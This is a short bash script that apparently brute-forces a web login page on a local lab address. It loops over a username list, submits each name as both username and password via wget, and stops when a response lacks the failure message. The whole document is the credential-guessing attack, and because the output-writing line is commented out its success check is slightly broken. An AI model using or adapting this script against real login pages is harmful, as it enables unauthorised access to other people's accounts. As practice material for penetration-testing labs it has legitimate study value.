#!/bin/bash

# usernamefile="/usr/share/wordlists/xato-net-10-million-usernames.txt"

usernamefile="possibleUsers.txt"
url="http://192.168.1.127/monitoring/login.php"

while read  username;
do
	commands="$url --post-data \"username=$username&password=$username\""
	echo $commands

	timeout 1 wget $commands 
# 2>&1 | tr "\n" " " | grep -v "Username/Password Authentication Failed" > output.txt
	lines=$(wc -l output.txt | awk '{print $1}')

	if [ $lines != "0" ];
	then
		echo "$username" found
		exit;
	fi
done < $usernamefile
